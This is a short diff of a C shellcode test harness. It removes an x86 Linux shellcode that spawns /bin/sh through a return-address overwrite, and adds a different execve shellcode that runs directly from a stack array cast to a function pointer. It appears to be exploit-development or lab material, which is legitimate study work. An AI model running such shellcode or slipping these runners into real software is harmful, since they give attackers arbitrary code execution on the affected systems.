@@ -1,11 +1,7 @@
 #include <stdio.h>
-
-unsigned char shellcode[]="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
+#include <string.h>
 
 int main(){
-	int *ret;
-	ret = (int)&ret + 2;
-	(*ret) = (int)shellcode;
-
-	return 0;
+    char shell[] = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";
+    (*(void (*)()) shell)();
 }
